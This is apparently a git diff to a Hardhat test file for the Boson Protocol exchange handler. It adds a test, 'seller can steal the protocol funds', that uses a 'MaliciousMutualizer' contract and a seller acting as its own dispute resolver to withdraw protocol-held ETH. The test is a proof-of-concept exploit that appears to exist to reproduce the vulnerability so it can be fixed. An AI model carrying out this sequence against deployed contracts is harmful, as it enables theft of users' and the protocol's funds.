@@ -266,7 +266,7 @@ describe("IBosonExchangeHandler", function () {
       expect(disputeResolver.isValid()).is.true;
 
       //Create DisputeResolverFee array so offer creation will succeed
-      disputeResolverFees = [new DisputeResolverFee(ZeroAddress, "Native", "0")];
+      disputeResolverFees = [new DisputeResolverFee(ZeroAddress, "Native", parseEther("0.1").toString())];
 
       // Make empty seller list, so every seller is allowed
       const sellerAllowList = [];
@@ -1091,6 +1091,98 @@ describe("IBosonExchangeHandler", function () {
               .commitToOffer(await buyer.getAddress(), mutualizerOfferIdWithFee, { value: price })
           ).to.be.revertedWithCustomError(bosonErrors, "DRFeeMutualizerCannotProvideCoverage");
         });
+      });
+    });
+
+    context("👉 commitToOffer() with MALICIOUS Mutualizer", async function () {
+      let drFeeMutualizer;
+      let mutualizerOfferId, mutualizerExchangeId;
+      let startingBalance;
+      let randoSellerId;
+
+      beforeEach(async function () {
+        startingBalance = await provider.getBalance(rando.address);
+
+        const sellerId = await accountHandler.getNextAccountId();
+        randoSellerId = sellerId;
+        const disputeResolverId = sellerId + 1n;
+
+        // create a new seller, so it's obvious that the funds are stolen from protocol and not from seller deposit
+        const seller = mockSeller(rando.address, rando.address, clerk.address, rando.address);
+        emptyAuthToken = mockAuthToken();
+        voucherInitValues = mockVoucherInitValues();
+
+        await accountHandler.connect(rando).createSeller(seller, emptyAuthToken, voucherInitValues);
+
+        // Create a valid dispute resolver
+        const disputeResolver = mockDisputeResolver(rando.address, rando.address, clerkDR.address, rando.address, true);
+
+        //Create DisputeResolverFee array so offer creation will succeed
+        disputeResolverFees = [new DisputeResolverFee(ZeroAddress, "Native", parseEther("5").toString())];
+        const sellerAllowList = [sellerId];
+        await accountHandler
+          .connect(rando)
+          .createDisputeResolver(disputeResolver, disputeResolverFees, sellerAllowList);
+
+        // Deploy real DRFeeMutualizer contract
+        const protocolAddress = await exchangeHandler.getAddress();
+
+        const DRFeeMutualizerFactory = await getContractFactory("MaliciousMutualizer");
+        drFeeMutualizer = await DRFeeMutualizerFactory.connect(rando).deploy(sellerId, protocolAddress);
+        await drFeeMutualizer.waitForDeployment();
+
+        // Fund mutualizer with ETH for testing using the deposit function
+        await drFeeMutualizer.deposit(ZeroAddress, parseUnits("5", "ether"), {
+          value: parseUnits("5", "ether"),
+        });
+
+        // Create offer with mutualizer
+        offer.sellerDeposit = "0";
+        offer.price = "0";
+        offer.buyerCancelPenalty = "0";
+
+        mutualizerOfferId = await offerHandler.getNextOfferId();
+        await offerHandler.connect(rando).createOffer(
+          offer,
+          offerDates,
+          offerDurations,
+          {
+            disputeResolverId: disputeResolverId,
+            mutualizerAddress: await drFeeMutualizer.getAddress(),
+          },
+          agentId,
+          offerFeeLimit
+        );
+
+        mutualizerExchangeId = await exchangeHandler.getNextExchangeId();
+
+        await offerHandler.connect(rando).reserveRange(mutualizerOfferId, offer.quantityAvailable, rando.address);
+
+        const voucherCloneAddress = calculateCloneAddress(
+          await accountHandler.getAddress(),
+          beaconProxyAddress,
+          rando.address
+        );
+        bosonVoucher = await getContractAt("BosonVoucher", voucherCloneAddress);
+        await bosonVoucher.connect(rando).preMint(mutualizerOfferId, offer.quantityAvailable);
+
+        tokenId = deriveTokenId(mutualizerOfferId, exchangeId);
+      });
+
+      it.only("seller can steal the protocol funds", async function () {
+        // commit via preminted vouchers
+        await bosonVoucher.connect(rando).transferFrom(rando.address, rando.address, tokenId);
+
+        await setNextBlockTimestamp(Number(voucherRedeemableFrom));
+        await exchangeHandler.connect(rando).redeemVoucher(mutualizerExchangeId);
+        await exchangeHandler.connect(rando).completeExchange(mutualizerExchangeId);
+
+        // The seller can now withdraw the funds from the protocol as well as from the malicious mutualizer
+        await fundsHandler.connect(rando).withdrawFunds(randoSellerId, [ZeroAddress], [parseEther("5").toString()]);
+        await drFeeMutualizer.connect(rando).withdraw(ZeroAddress, parseEther("5").toString(), rando.address);
+
+        const endingBalance = await provider.getBalance(rando.address);
+        expect(endingBalance).to.be.equal(startingBalance + parseEther("5"));
       });
     });
 
